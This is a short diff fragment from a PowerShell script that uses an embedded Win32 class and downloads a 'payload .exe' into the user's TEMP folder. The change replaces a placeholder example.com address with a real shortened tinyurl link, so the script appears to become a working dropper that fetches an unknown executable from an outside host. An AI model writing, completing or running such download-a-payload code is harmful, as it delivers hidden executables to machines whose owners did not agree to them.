@@ -71,7 +71,7 @@ public class Win32 {
 "@ -PassThru
 
 # Replace this with your direct link to the payload .exe
-$payloadUrl = "https://example.com/payload.exe"
+$payloadUrl = "https://tinyurl.com/mwr259jv"
 $tempPath = "$env:TEMP\payload.exe"
 
 try {
